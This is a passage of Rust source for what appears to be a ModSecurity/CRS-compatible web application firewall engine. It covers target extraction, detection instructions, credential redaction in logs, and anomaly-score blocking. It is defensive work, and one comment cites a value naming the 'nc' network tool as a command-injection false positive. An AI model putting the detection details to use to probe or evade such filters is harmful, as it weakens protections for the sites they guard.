        builds.set(n);
    });
}

#[cfg(not(test))]
fn note_view_built(_: View) {}

/// `last_matched` is what the PREVIOUS condition in the current chain matched.
/// It is threaded in rather than read from `ctx` because it is VM state that
/// lives for one rule: `TargetSpec::MatchedVar` is the only consumer, and
/// resolving it anywhere else would silently yield nothing.
///
/// Reads the parsed collections from `views` — see `RequestViews`.
fn extract_target(
    spec: &TargetSpec,
    ctx: &RequestContext,
    views: &RequestViews,
    last_matched: Option<&str>,
) -> Vec<String> {
    match spec {
        // Outside a chain nothing has matched yet, and an empty list is the
        // honest answer: the condition simply does not match.
        TargetSpec::MatchedVar => last_matched.map(|v| vec![v.to_owned()]).unwrap_or_default(),
        // ARGS also includes urlencoded / JSON POST body parameters, after the
        // query-string ones.
        TargetSpec::Args => views
            .query(ctx)
            .iter()
            .chain(views.body(ctx))
            .map(|(_, v)| v.clone())
            .collect(),
        TargetSpec::ArgsNames => views
            .query(ctx)
            .iter()
            .chain(views.body(ctx))
            .map(|(k, _)| k.clone())
            .collect(),
        TargetSpec::RequestUri => vec![ctx.uri.to_string()],
        TargetSpec::RequestFilename => vec![ctx.uri.path().to_owned()],
        TargetSpec::RequestMethod => vec![ctx.method.as_str().to_owned()],
        TargetSpec::RequestLine => {
            vec![format!("{} {} {:?}", ctx.method, ctx.uri, ctx.http_version)]
        }
        // ModSecurity spells the version `HTTP/1.1`, `HTTP/2.0`, and CRS
        // compares against that exact text: 920180 uses
        // `!@within HTTP/2 HTTP/2.0 HTTP/3 HTTP/3.0` and 920430 checks
        // `%{tx.allowed_http_versions}`. `Version`'s Debug form is already that
        // spelling, which is why `RequestLine` above uses it too.
        TargetSpec::RequestProtocol => vec![format!("{:?}", ctx.http_version)],
        // Which parser handled the body, named as ModSecurity names it.
        //
        // Derived from Content-Type rather than stored on the context, because
        // that is exactly how the choice is made in the first place — see
        // `body_args`, which dispatches on the same header. Keeping one source
        // of that decision means the two cannot disagree about whether a body
        // was JSON.
        TargetSpec::ReqbodyProcessor => {
            let ct = views.content_type(ctx);
            let processor = if ct.starts_with("application/json") || ct.contains("+json") {
                "JSON"
            } else if is_xml_content_type(ct) {
                "XML"
            } else if ct.starts_with("multipart/form-data") {
                "MULTIPART"
            } else if ct.starts_with("application/x-www-form-urlencoded") {
                "URLENCODED"
            } else {
                // ModSecurity leaves it unset when no processor ran. Returning a
                // single empty string rather than an empty vec matters: an empty
                // vec makes the operator return `Absent` and the rule cannot
                // evaluate, so `!@streq JSON` would never fire on a bodiless
                // request — which is precisely when CRS 920540 wants it to.
                ""
            };
            vec![processor.to_owned()]
        }
        // For multipart/form-data, yield the PARSED part values rather than the
        // raw envelope. ModSecurity/CRS deliberately leave REQUEST_BODY empty for
        // multipart — the parts reach ARGS instead — and handing rules the raw
        // envelope makes the envelope's own structure look like an attack: the
        // `\r\n\r\n` separating a part's headers from its value satisfies the
        // newline operator in command-injection patterns, so any field whose value
        // begins with a command word false-positives. Measured: a multipart field
        // holding the ordinary text `nc 8000 controller` was blocked by 9900207,
        // while the identical value in a urlencoded form passed.
        //
        // No coverage is lost. The part values are still inspected — that is what
        // this returns — and scanning them individually is strictly better for
        // wholly-encoded payloads, which only decode once separated from the
        // boundary noise.
        TargetSpec::RequestBody => {
            if views.content_type(ctx).starts_with("multipart/form-data") {
                views
                    .multipart(ctx)
                    .fields
                    .iter()
                    .map(|(_, v)| v.clone())
                    .collect()
            } else {
                ctx.request_body
                    .as_ref()
                    .map(|b| vec![String::from_utf8_lossy(b).into_owned()])
                    .unwrap_or_default()
            }
        }
        TargetSpec::RequestHeadersAll => ctx
            .request_headers
            .values()
            .filter_map(|v| v.to_str().ok())
            .map(String::from)
            .collect(),
        TargetSpec::RequestHeader(name) => ctx
            .request_headers
            .get(name.as_str())
            .and_then(|v| v.to_str().ok())
            .map(|v| vec![v.to_owned()])
            .unwrap_or_default(),
        // Cookie NAMES. Session-fixation and cookie-injection rules match on the
        // name side, so returning values here would silently never fire them.
        TargetSpec::RequestCookiesNames => {
            views.cookies(ctx).iter().map(|(k, _)| k.clone()).collect()
        }
        // Header NAMES. HeaderMap keys are already lowercased by hyper, which
        // matches CRS expectations — its header-name patterns are written
        // case-insensitively.
        TargetSpec::RequestHeadersNames => ctx
            .request_headers
            .keys()
            .map(|k| k.as_str().to_owned())
            .collect(),
        // ARGS_GET is the query string ONLY. Deliberately not `Args`: a rule
        // written for the query side would otherwise also score body parameters,
        // which is how a query-only restriction turns into a false positive on a
        // legitimate POST.
        TargetSpec::ArgsGet => views.query(ctx).iter().map(|(_, v)| v.clone()).collect(),
        TargetSpec::ArgsGetNames => views.query(ctx).iter().map(|(k, _)| k.clone()).collect(),
        // The raw, still-encoded query string. CRS uses this for rules that must
        // see the encoding itself — double-encoding and separator abuse — so it
        // must NOT be decoded here.
        TargetSpec::QueryString => vec![ctx.uri.query().unwrap_or("").to_owned()],
        TargetSpec::RequestCookiesAll => {
            views.cookies(ctx).iter().map(|(_, v)| v.clone()).collect()
        }
        TargetSpec::RequestCookie(name) => views
            .cookies(ctx)
            .iter()
            .filter(|(k, _)| k == name)
            .map(|(_, v)| v.clone())
            .collect(),
        TargetSpec::ResponseHeadersAll => ctx
            .response_headers
            .as_ref()
            .map(|h| {
                h.values()
                    .filter_map(|v| v.to_str().ok())
                    .map(String::from)
                    .collect()
            })
            .unwrap_or_default(),
        TargetSpec::ResponseHeader(name) => ctx
            .response_headers
            .as_ref()
            .and_then(|h| h.get(name.as_str()))
            .and_then(|v| v.to_str().ok())
            .map(|v| vec![v.to_owned()])
            .unwrap_or_default(),
        TargetSpec::ResponseBody => ctx
            .response_body
            .as_ref()
            .map(|b| vec![String::from_utf8_lossy(b).into_owned()])
            .unwrap_or_default(),
        TargetSpec::MultipartPartHeadersAll => views
            .multipart(ctx)
            .part_headers
            .iter()
            .map(|(_, line)| line.clone())
            .collect(),
        // Selecting by PART name, not header name — see the importer note. Used
        // as `&MULTIPART_PART_HEADERS:_charset_`, where a non-zero count means
        // the request carried a `_charset_` form field.
        TargetSpec::MultipartPartHeader(part) => views
            .multipart(ctx)
            .part_headers
            .iter()
            .filter(|(n, _)| n.eq_ignore_ascii_case(part))
            .map(|(_, line)| line.clone())
            .collect(),
        TargetSpec::Files => views.multipart(ctx).filenames.clone(),
        TargetSpec::FilesNames => views.multipart(ctx).field_names.clone(),
        TargetSpec::FilesCombinedSize => vec![views.multipart(ctx).combined_size.to_string()],
        TargetSpec::ArgsCombinedSize => {
            // ModSecurity counts BOTH sides of every argument: the name and the
            // value. Counting values alone would under-report a request that
            // smuggles its payload into parameter names, which is exactly the
            // shape 920390 exists to bound.
            let total: usize = views
                .query(ctx)
                .iter()
                .chain(views.body(ctx))
                .map(|(k, v)| k.len() + v.len())
                .sum();
            vec![total.to_string()]
        }
        TargetSpec::RemoteAddr => vec![ctx.client_ip.to_string()],
        TargetSpec::Geo => vec![], // TODO: GeoIP in Phase 2
        TargetSpec::TxVar(name) => ctx
            .tx_vars
            .get(name)
            .map(|v| vec![v.clone()])
            .unwrap_or_default(),
        TargetSpec::CountOf(inner) => {
            let count = match inner.as_ref() {
                TargetSpec::RequestHeader(name) => {
                    ctx.request_headers.get_all(name.as_str()).iter().count()
                }
                TargetSpec::ResponseHeader(name) => ctx
                    .response_headers
                    .as_ref()
                    .map(|h| h.get_all(name.as_str()).iter().count())
                    .unwrap_or(0),
                other => views.load(other, ctx, last_matched).len(),
            };
            vec![count.to_string()]
        }
    }
}

// ---------------------------------------------------------------------------
// Severity mapping
// ---------------------------------------------------------------------------

fn map_severity(s: RuleSeverity) -> Severity {
    match s {
        RuleSeverity::Critical => Severity::Critical,
        RuleSeverity::High => Severity::High,
        RuleSeverity::Medium => Severity::Medium,
        RuleSeverity::Low => Severity::Low,
        RuleSeverity::Notice => Severity::Notice,
    }
}

/// Re-exported so this module reads naturally; the list itself lives in
/// `sentinel-core` because the proxy's access-log redaction must use exactly the
/// same one. Two lists that must agree are a list that will drift — and the gap
/// between them was a real leak (cookies were covered by neither).
use sentinel_core::redact::is_sensitive_field_name;

/// The values of every sensitively-named field in this request.
///
/// Collected ONCE per `evaluate` call (per phase) and cached by the caller, on
/// the first fired rule that captured anything. It reads the query and body
/// through `views`, so it adds no parse of its own; only the sensitive values
/// are copied. The list is normally empty, and short when it is not.
fn collect_sensitive_values(ctx: &RequestContext, views: &RequestViews) -> Vec<String> {
    // Cookies and headers were MISSING here, and that was the hole. CRS 942100
    // (SQLi via libinjection) is multi-target and includes REQUEST_COOKIES, and
    // a multi-target rule leaves `RuleMatch.target` empty — so the proxy's
    // second, target-based redaction pass could not catch it either. A session
    // JWT that tripped libinjection was therefore written verbatim to waf.log,
    // to ClickHouse under a 90-day TTL, and out to the SIEM.
    let args = views
        .query(ctx)
        .iter()
        .chain(views.body(ctx))
        .map(|(name, value)| (name.as_str(), value.as_str()));

    // Cookies are not collected here: EVERY cookie value is withheld at capture
    // (see `withheld_cookie_value`), whatever its name. Judging them by name let
    // an Express session called `node-js` through, and reading only the first
    // Cookie field missed every cookie after it on HTTP/2 and HTTP/3.

    // Header values, keyed by header name — Authorization, X-Api-Key and
    // friends. Cheap: a request carries a few dozen headers at most, and this
    // runs once per phase, not once per rule.
    let headers = ctx
        .request_headers
        .iter()
        // `Cookie` is skipped: its values are handled, one cookie at a time,
        // by `withheld_cookie_value`, which also catches a rule matching the
        // WHOLE header (the match text carries each value).
        .filter(|(name, _)| !name.as_str().eq_ignore_ascii_case("cookie"))
        .filter_map(|(name, value)| Some((name.as_str(), value.to_str().ok()?)));

    args.chain(headers)
        .filter(|(name, value)| !value.is_empty() && is_sensitive_field_name(name))
        .map(|(_, value)| value.to_owned())
        .collect()
}

/// True when `value` is the value of a sensitively-named request field.
///
/// A rule firing on a password field is usually a FALSE POSITIVE — real
/// passwords contain quotes, `OR`, and SQL keywords — and capturing the payload
/// there would write a live credential into the log an operator then pastes
/// into a ticket. The target label cannot answer this: CRS rules are
/// multi-target and `TargetSpec::Args` labels as bare `ARGS`, never
/// `ARGS:password`. So the request's own fields are consulted instead, and the
/// check happens at capture time — the value never reaches `RuleMatch`, so no
/// downstream consumer can leak what it never received.
fn value_is_sensitive(sensitive_values: &[String], value: &str) -> bool {
    if value.is_empty() {
        return false;
    }
    sensitive_values.iter().any(|field_value| {
        // An exact match is a credential at any length: the operator matched
        // this field's whole value.
        if field_value == value {
            return true;
        }
        // Substring matching in EITHER direction, because a transform may have
        // trimmed or decoded the value before the operator saw it — but only
        // for a field value long enough to identify one specific secret.
        //
        // Without this floor the check is catastrophic in the FALSE-POSITIVE
        // direction. Sensitive fields are now collected from every cookie and
        // header, and short ones are commonplace: `X-Auth-Version: 1`,
        // `authed=1`, `otp=123456`. A one-character field value makes
        // `value.contains("1")` true for nearly every attack payload, and the
        // log silently degrades to `[redacted]` on every line — losing exactly
        // the forensic detail this capture exists to provide. Redacting too
        // much is not the safe direction; it is a different failure.
        const MIN_IDENTIFYING_LEN: usize = 8;
        field_value.len() >= MIN_IDENTIFYING_LEN
            && (field_value.contains(value) || value.contains(field_value.as_str()))
    })
}

/// Cap and sanitize a matched value for retention on the `RuleMatch`.
///
/// 256 chars is enough to judge a false positive (the CRS's own `logdata`
/// convention truncates similarly); control characters are stripped so a
/// payload cannot smuggle newlines/ANSI into an NDJSON line or a terminal.
/// Truncation walks back to a char boundary — a payload is untrusted input
/// and a mid-codepoint slice would panic.
fn cap_matched(s: &str) -> String {
    const MAX: usize = 256;
    let cleaned: String = s
        .chars()
        .map(|c| if c.is_control() { ' ' } else { c })
        .collect();
    if cleaned.len() <= MAX {
        return cleaned;
    }
    let mut end = MAX;
    while end > 0 && !cleaned.is_char_boundary(end) {
        end -= 1;
    }
    format!("{}…", &cleaned[..end])
}

/// Record the text a match instruction matched, for the rule being evaluated.
///
/// Only ever records a HIT — that is the whole point. A single rule commonly
/// inspects several targets (CRS 942100 is
/// `ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_HEADERS|XML:/*`) and the compiler
/// emits one match instruction per target. Assigning the result directly meant a
/// later target that did NOT match overwrote the value an earlier one DID match
/// with `None`, so multi-target rules — most of CRS — routinely recorded an
/// empty payload on a real detection.
///
/// The LAST genuine hit wins, which matters for `chain`. A chain is an AND of
/// several links, and CRS writes the cheap precondition first and the real
/// detection last:
///
/// ```text
/// SecRule REQUEST_FILENAME "@rx /admin" "chain"
///   SecRule ARGS "@detectSQLi"
/// ```
///
/// Keeping the first hit records `/admin` — true, and useless. The operator
/// needs the payload from the link that actually detected something.
///
/// `last_matched` is cleared at every `RuleEnd`, so a value can never be
/// attributed to a later rule.
fn record_match<S: AsRef<str>>(last_matched: &mut Option<String>, hit: Option<S>) {
    if let Some(v) = hit {
        *last_matched = Some(cap_matched(v.as_ref()));
    }
}

// ---------------------------------------------------------------------------
// VM evaluator
// ---------------------------------------------------------------------------

/// Execute the instruction program for `phase` against `ctx`.
///
/// Returns the final `WafDecision` (may update `ctx.decision` and
/// `ctx.rule_matches` internally).
pub fn evaluate(
    ruleset: &CompiledRuleSet,
    ctx: &mut RequestContext,
    phase: Phase,
    anomaly_threshold: u32,
) -> WafDecision {
    let response_phase = is_response_phase(&phase);
    let phase_idx = phase as usize;
    let program = &ruleset.phase_programs[phase_idx];

    // Parsed request collections, built once and shared by every rule for the
    // rest of this call — and dropped with it. See `RequestViews`.
    let views = RequestViews::default();
    let mut stack: Vec<StackVal> = Vec::with_capacity(16);
    let mut ip: usize = 0; // instruction pointer
                           // Per-rule target attribution, reset at every RuleEnd. The spec,
                           // not its label: the label is only formatted for a rule that fires.
    let mut last_target: Option<&TargetSpec> = None;
    let mut targets_seen = 0usize;
    // Sensitive field values for credential redaction, computed at most once per
    // phase on the first fired rule that captured anything — see
    // `collect_sensitive_values`. Stays `None` for the overwhelmingly common
    // case of a request where no rule fires at all.
    let mut sensitive_values: Option<Vec<String>> = None;
    // Every cookie value (raw and decoded), for `withheld_cookie_value`. Built
    // lazily like `sensitive_values`.
    let mut cookie_values: Option<Vec<String>> = None;
    // The text the most recent Match* instruction of the CURRENT rule matched,
    // reset at every RuleEnd alongside the target attribution. Every match
    // instruction that can name its text writes here (Some on hit, None on
    // miss), so a stale value from an earlier rule can never be attributed to
    // a later one.
    let mut last_matched: Option<String> = None;

    while ip < program.len() {
        // Early exit only on a real BLOCK — the same rule as the proxy's
        // `still_evaluating`. This read `!= Allow`, and `Log` is not `Allow`:
        // once learning mode had downgraded a verdict to Log (an over-long URI,
        // or the request's own anomaly verdict), every later call returned at
        // its first instruction. The proxy's phase-1 fix let the rule engine be
        // CALLED after a Log, but the engine then ran nothing; and on a
        // learning-mode site the response rules never ran for any request that
        // had already scored — the attack traffic most likely to leak.
        // Challenge and Limit are not refusals either. (Code review finding.)
        if ctx.decision == WafDecision::Block {
            return ctx.decision.clone();
        }

        let instr = &program[ip];
        match instr {
            Instruction::LoadTarget(spec) => {
                // Track which part of the request this rule looked at, so a
                // security event can name the parameter an operator would exclude.
                //
                // Counted, not merely remembered: a rule that evaluates SEVERAL
                // targets (chains, `ARGS|REQUEST_HEADERS`) offers no way to tell
                // from here WHICH one the operator matched, and naming the wrong
                // parameter would send someone to write an exclusion against a
                // target that never fired. So the label is kept only when the rule
                // inspected exactly one target, and left empty otherwise.
                targets_seen += 1;
                last_target = Some(spec);
                // The compiler emits a target's transform chain right after
                // it. For a memoizable target, take the transformed values
                // from the memo and step over the ApplyTransforms. multiMatch
                // keeps every intermediate step and is left to run in full.
                if let Some(Instruction::ApplyTransforms {
                    transforms,
                    multi_match: false,
                }) = program.get(ip + 1)
                {
                    if memoizable(spec) {
                        let values = views.load_transformed(spec, transforms, ctx);
                        stack.push(StackVal::Strings(values));
                        ip += 2;
                        continue;
                    }
                }
                let values = views.load(spec, ctx, last_matched.as_deref());
                stack.push(StackVal::Strings(values));
            }

            Instruction::MatchRx { pattern_id } => {
                let values = pop_strings(&mut stack);
                if values.is_empty() {
                    stack.push(StackVal::Absent);
                } else {
                    let regex = &ruleset.patterns[*pattern_id];
                    // Regex capture groups populate TX.0 (whole match) and
                    // TX.1..TX.9 (groups), which is what a CHAINED condition
                    // reads: `SecRule TX:1 "!@rx ..."`.
                    //
                    // Without this, every capture-then-chain rule was inert —
                    // not false-positive, silently inert, because TX:1 yielded
                    // no values and a target with no values cannot match even
                    // when the condition is negated. 14 shipped rules across
                    // 922 (multipart), 942 (SQLi), 932 (RCE), 933 (PHP), 920
                    // (protocol) and 943 (session fixation) are built this way.
                    //
                    // Deviation from ModSecurity, deliberate: it populates these
                    // only for rules carrying the `capture` action, whereas this
                    // populates whenever the pattern HAS groups. The importer
                    // treats `capture` as a no-op, and threading the flag through
                    // the AST, compiler and instruction set would change nothing
                    // observable — no shipped rule writes a bare `tx.<digit>`
                    // (checked: the only digit-ish names are `tx.922100_charset`
                    // and friends), and nothing reads TX:N unless it captured.
                    // It also makes `logdata:'%{TX.0}'` report the text that
                    // actually matched instead of an empty string.
                    let matched = if regex.captures_len() > 1 {
                        let mut hit = false;
                        for s in values.iter() {
                            if let Some(caps) = regex.captures(s) {
                                for (i, g) in caps.iter().enumerate().take(10) {
                                    if let Some(m) = g {
                                        ctx.tx_vars.insert(i.to_string(), m.as_str().to_owned());
                                    }
                                }
                                record_match(&mut last_matched, caps.get(0).map(|m| m.as_str()));
                                hit = true;
                                break; // first match wins, as ModSecurity does
                            }
                        }
                        hit
                    } else {
                        // `find` instead of `is_match` so the matched text can be
                        // named on the eventual security event; same lazy-DFA
                        // path, and it still stops at the first matching value.
                        let mut hit = false;
                        for s in values.iter() {
                            if let Some(m) = regex.find(s) {
                                record_match(&mut last_matched, Some(m.as_str()));
                                hit = true;
                                break;
                            }
                        }
                        hit
                    };
                    debug!(pattern = %regex.as_str(), matched, "MatchRx");
                    stack.push(StackVal::Bool(matched));
                }
            }

            Instruction::MatchMulti { set_id } => {
                let values = pop_strings(&mut stack);
                if values.is_empty() {
                    stack.push(StackVal::Absent);
                } else {
                    let ac = &ruleset.ac_sets[*set_id];
                    // The AC set cannot cheaply name WHICH pattern hit, but the
                    // value that contained it is what an operator needs to see.
                    let hit_value = values.iter().find(|s| ac.is_match(s));
                    let matched = hit_value.is_some();
                    record_match(&mut last_matched, hit_value);
                    debug!(set_id, matched, "MatchMulti");
                    stack.push(StackVal::Bool(matched));
                }
            }

            Instruction::MatchInterpolated { cmp, raw_id } => {
                let values = pop_strings(&mut stack);
                let raw = &ruleset.literals[*raw_id];
                match expand_operator_macros(raw, ctx) {
                    // A macro we cannot resolve makes the comparison meaningless.
                    // Push Absent, NOT Bool(false): `Not(Absent)` is false, so a
                    // negated policy check (`!@within %{tx.allowed_methods}`)
                    // degrades to "did not fire" instead of "deny everything".
                    None => {
                        debug!(raw = %raw, "MatchInterpolated: unresolved macro — absent");
                        stack.push(StackVal::Absent);
                    }
                    Some(pat) if values.is_empty() => {
                        let _ = pat;
                        stack.push(StackVal::Absent);
                    }
                    Some(pat) => {
                        // `None` here means "cannot be decided", and is pushed as
                        // Absent for the same reason as an unresolved macro.
                        let verdict: Option<bool> = match cmp {
                            InterpCmp::Streq => Some(values.iter().any(|v| *v == pat)),
                            // ModSecurity @within: the VALUE sits inside the
                            // pattern. CRS depends on this with pipe-delimited
                            // lists like `|utf-8| |iso-8859-1|`.
                            InterpCmp::Within => {
                                Some(values.iter().any(|v| pat.contains(v.as_str())))
                            }
                            InterpCmp::EndsWith => Some(values.iter().any(|v| v.ends_with(&pat))),
                            // A non-numeric bound is undecidable, NOT zero.
                            // Treating it as 0 would make `@gt %{tx.max_num_args}`
                            // fire on any request carrying a single argument.
                            InterpCmp::Ge | InterpCmp::Gt | InterpCmp::Lt => {
                                pat.trim().parse::<f64>().ok().map(|bound| {
                                    values.iter().any(|v| {
                                        v.trim().parse::<f64>().is_ok_and(|n| match cmp {
                                            InterpCmp::Ge => n >= bound,
                                            InterpCmp::Gt => n > bound,
                                            _ => n < bound,
                                        })
                                    })
                                })
                            }
                        };
                        match verdict {
                            Some(matched) => {
                                debug!(pat = %pat, matched, "MatchInterpolated");
                                stack.push(StackVal::Bool(matched));
                            }
                            None => {
                                debug!(pat = %pat, "MatchInterpolated: undecidable bound — absent");
                                stack.push(StackVal::Absent);
                            }
                        }
                    }
                }
            }

            Instruction::MatchEq { literal_id } => {
                let values = pop_strings(&mut stack);
                if values.is_empty() {
                    stack.push(StackVal::Absent);
                } else {
                    let literal = &ruleset.literals[*literal_id];
                    let hit = values.iter().find(|s| *s == literal);
                    let matched = hit.is_some();
                    record_match(&mut last_matched, hit);
                    stack.push(StackVal::Bool(matched));
                }
            }

            Instruction::Exists => {
                let values = pop_strings(&mut stack);
                let exists = !values.is_empty() && values.iter().any(|s| !s.is_empty());
                stack.push(StackVal::Bool(exists));
            }

            // The libinjection operators below name the whole offending VALUE
            // rather than a substring — libinjection reports a verdict, not a
            // span. These two back rules 942100 and 941100, the most-fired
            // rules in the product, so leaving them uninstrumented would have
            // left payload capture blind exactly where it matters most.
            Instruction::DetectSqli => {
                let values = pop_strings(&mut stack);
                if values.is_empty() {
                    stack.push(StackVal::Absent);
                } else {
                    let hit = values
                        .iter()
                        .find(|s| libinjectionrs::detect_sqli(s.as_bytes()).is_injection());
                    let matched = hit.is_some();
                    record_match(&mut last_matched, hit);
                    debug!(matched, "DetectSqli");
                    stack.push(StackVal::Bool(matched));
                }
            }

            Instruction::DetectXss => {
                let values = pop_strings(&mut stack);
                if values.is_empty() {
                    stack.push(StackVal::Absent);
                } else {
                    let hit = values
                        .iter()
                        .find(|s| libinjectionrs::detect_xss(s.as_bytes()).is_injection());
                    let matched = hit.is_some();
                    record_match(&mut last_matched, hit);
                    debug!(matched, "DetectXss");
                    stack.push(StackVal::Bool(matched));
                }
            }

            Instruction::DetectOffDomainUrl => {
                let values = pop_strings(&mut stack);
                if values.is_empty() {
                    stack.push(StackVal::Absent);
                } else {
                    let host = views.host(ctx);
                    let hit = values.iter().find(|v| contains_off_domain_url(v, host));
                    let matched = hit.is_some();
                    record_match(&mut last_matched, hit);
                    debug!(matched, "DetectOffDomainUrl");
                    stack.push(StackVal::Bool(matched));
                }
            }

            Instruction::DetectSsrfUrl => {
                let values = pop_strings(&mut stack);
                if values.is_empty() {
                    stack.push(StackVal::Absent);
                } else {
                    let hit = values.iter().find(|v| crate::ssrf::contains_ssrf_url(v));
                    let matched = hit.is_some();
                    record_match(&mut last_matched, hit);
                    debug!(matched, "DetectSsrfUrl");
                    stack.push(StackVal::Bool(matched));
                }
            }

            Instruction::IpMatch { cidrs } => {
                let values = pop_strings(&mut stack);
                if values.is_empty() {
                    stack.push(StackVal::Absent);
                } else {
                    let hit = values.iter().find(|v| ip_in_any_cidr(v, cidrs));
                    let matched = hit.is_some();
                    record_match(&mut last_matched, hit);
                    debug!(matched, "IpMatch");
                    stack.push(StackVal::Bool(matched));
                }
            }

            Instruction::ValidateByteRange { ranges } => {
                let values = pop_strings(&mut stack);
                if values.is_empty() {
                    stack.push(StackVal::Absent);
                } else {
                    // The spec lists the ALLOWED bytes; the operator fires on
                    // anything outside it. Compared over bytes, not chars: the
                    // whole point of 920270 is a NUL, and 920271 catches control
                    // characters — neither survives a lossy char conversion.
                    let hit = values.iter().find(|v| {
                        v.bytes()
                            .any(|b| !ranges.iter().any(|(lo, hi)| b >= *lo && b <= *hi))
                    });
                    let matched = hit.is_some();
                    record_match(&mut last_matched, hit);
                    debug!(matched, "ValidateByteRange");
                    stack.push(StackVal::Bool(matched));
                }
            }

            Instruction::ValidateUrlEncoding => {
                let values = pop_strings(&mut stack);
                if values.is_empty() {
                    stack.push(StackVal::Absent);
                } else {
                    let hit = values.iter().find(|v| has_invalid_url_encoding(v));
                    let matched = hit.is_some();
                    record_match(&mut last_matched, hit);
                    debug!(matched, "ValidateUrlEncoding");
                    stack.push(StackVal::Bool(matched));
                }
            }

            Instruction::ValidateUtf8Encoding => {
                let values = pop_strings(&mut stack);
                if values.is_empty() {
                    stack.push(StackVal::Absent);
                } else {
                    let hit = values.iter().find(|v| has_invalid_utf8_encoding(v));
                    let matched = hit.is_some();
                    record_match(&mut last_matched, hit);
                    debug!(matched, "ValidateUtf8Encoding");
                    stack.push(StackVal::Bool(matched));
                }
            }

            Instruction::Never => {
                let _ = pop_strings(&mut stack);
                stack.push(StackVal::Bool(false));
            }

            Instruction::ApplyTransforms {
                transforms,
                multi_match,
            } => {
                let values = pop_strings(&mut stack);
                if transforms.is_empty() {
                    // Nothing to apply: pass the (possibly memoized) values on
                    // as they are rather than copying them.
                    stack.push(StackVal::Strings(values));
                } else if *multi_match {
                    // multiMatch: collect the original values plus the result
                    // after each cumulative transform prefix so the subsequent
                    // operator can match at any intermediate step.
                    let mut all: Vec<String> =
                        Vec::with_capacity(values.len() * (transforms.len() + 1));
                    for v in values.iter() {
                        let mut s = v.clone();
                        all.push(s.clone()); // original
                        for t in transforms.iter() {
                            s = apply_single_transform(s, t);
                            all.push(s.clone()); // after this transform
                        }
                    }
                    stack.push(StackVal::Strings(Rc::new(all)));
                } else {
                    let transformed: Vec<String> = match Rc::try_unwrap(values) {
                        Ok(owned) => owned
                            .into_iter()
                            .map(|s| apply_transforms(s, transforms))
                            .collect(),
                        // Still shared with the memo: transform copies and
                        // leave the cached values intact for the next rule.
                        Err(shared) => shared
                            .iter()
                            .map(|s| apply_transforms(s.clone(), transforms))
                            .collect(),
                    };
                    stack.push(StackVal::Strings(Rc::new(transformed)));
                }
            }

            Instruction::LoadAnomalyScore => {
                // The REQUEST total, in every phase — deliberately. The only
                // rules that read it are SRL rules, and an SRL rule scores the
                // request total even in a response phase (see fire_rule); CRS's
                // outbound total is read through TX:OUTBOUND_ANOMALY_SCORE_PLn.
                stack.push(StackVal::Int(ctx.anomaly_score as i64));
            }

            Instruction::CmpGe { threshold } => {
                let val = pop_numeric_f64(&mut stack);
                stack.push(StackVal::Bool(val >= *threshold));
            }

            Instruction::MlScore { model_id } => {
                let model_name = &ruleset.ml_models[*model_id];
                let score = ctx.ml_scores.get(model_name).copied().unwrap_or(0.0);
                stack.push(StackVal::Float(score));
            }

            Instruction::RateCheck { window_id: _ } => {
                // TODO: integrate with sentinel-modules rate-limiter in Phase 2
                stack.push(StackVal::Bool(false));
            }

            Instruction::And => {
                let b = pop_bool(&mut stack);
                let a = pop_bool(&mut stack);
                stack.push(StackVal::Bool(a && b));
            }

            Instruction::Or => {
                let b = pop_bool(&mut stack);
                let a = pop_bool(&mut stack);
                stack.push(StackVal::Bool(a || b));
            }

            Instruction::Not => match stack.pop() {
                Some(StackVal::Absent) => stack.push(StackVal::Bool(false)),
                Some(StackVal::Bool(b)) => stack.push(StackVal::Bool(!b)),
                other => {
                    warn!("VM: Not: unexpected stack value {:?}", other);
                    stack.push(StackVal::Bool(false));
                }
            },

            Instruction::JmpIfFalse { offset } => {
                if let Some(StackVal::Bool(false)) = stack.last() {
                    let new_ip = (ip as i64 + *offset as i64) as usize;
                    ip = new_ip;
                    continue;
                }
            }

            Instruction::RuleEnd { rule_id } => {
                let fired = pop_bool(&mut stack);
                let matched_target = if targets_seen == 1 {
                    last_target.take().map(TargetSpec::label)
                } else {
                    None
                };
                last_target = None;
                targets_seen = 0;
                let matched_value = last_matched.take();
                if fired {
                    if let Some(meta) = ruleset.rule_meta.get(rule_id) {
                        // Redact at capture time, so a credential never enters
                        // RuleMatch and no consumer can leak what it never got.
                        // A cookie value first — every one, whatever its name —
                        // then any sensitively-named field.
                        let matched_value = matched_value.map(|v| {
                            let cookies = cookie_values.get_or_insert_with(|| {
                                sentinel_core::redact::request_cookie_values(&ctx.request_headers)
                            });
                            if let Some(w) =
                                sentinel_core::redact::withheld_cookie_value(&v, cookies)
                            {
                                return w;
                            }
                            let sensitive = sensitive_values
                                .get_or_insert_with(|| collect_sensitive_values(ctx, &views));
                            if value_is_sensitive(sensitive, &v) {
                                "[redacted: sensitive field]".to_string()
                            } else {
                                v
                            }
                        });
                        fire_rule(ctx, meta, matched_target, matched_value);
                        // skipAfter: scan forward for the named Marker and jump to it.
                        // ip += 1 at loop end then steps past the Marker (which is a no-op).
                        if let Some(marker) = &meta.skip_after {
                            let search_from = ip + 1;
                            if let Some(rel) = program[search_from..].iter().position(|instr| {
                                if let Instruction::Marker(m) = instr {
                                    m == marker
                                } else {
                                    false
                                }
                            }) {
                                ip = search_from + rel;
                            }
                        }
                        // Short-circuit: if anomaly score exceeds threshold, block immediately.
                        // In a response phase the caller passes the OUTBOUND
                        // threshold, for the outbound total; the request total
                        // there (an operator's SRL response rule adds to it) is
                        // judged against the site's own threshold, which the
                        // proxy stamps on the context.
                        let hit = if !(anomaly_threshold > 0 && ctx.decision != WafDecision::Block)
                        {
                            None
                        } else if !response_phase {
                            (ctx.anomaly_score >= anomaly_threshold).then_some((
                                "anomaly score",
                                ctx.anomaly_score,
                                anomaly_threshold,
                            ))
                        } else if ctx.outbound_anomaly_score >= anomaly_threshold {
                            Some((
                                "outbound anomaly score",
                                ctx.outbound_anomaly_score,
                                anomaly_threshold,
                            ))
                        } else {
                            ctx.anomaly_threshold
                                .filter(|t| *t > 0 && ctx.anomaly_score >= *t)
                                .map(|t| ("anomaly score", ctx.anomaly_score, t))
                        };
                        if let Some((which, score, t)) = hit {
                            ctx.decision = WafDecision::Block;
                            ctx.block_reason = Some(format!("{which} {score} >= threshold {t}"));
                            return WafDecision::Block;
                        }
                    } else {
                        warn!(rule_id, "RuleEnd: no metadata found for rule");
                    }
                }
            }

            Instruction::Marker(_) => {
                // Named label — no-op at runtime; used as a skip target.
            }
        }
        ip += 1;
    }

    ctx.decision.clone()
}

fn fire_rule(
    ctx: &mut RequestContext,
    meta: &RuleMeta,
    matched_target: Option<String>,
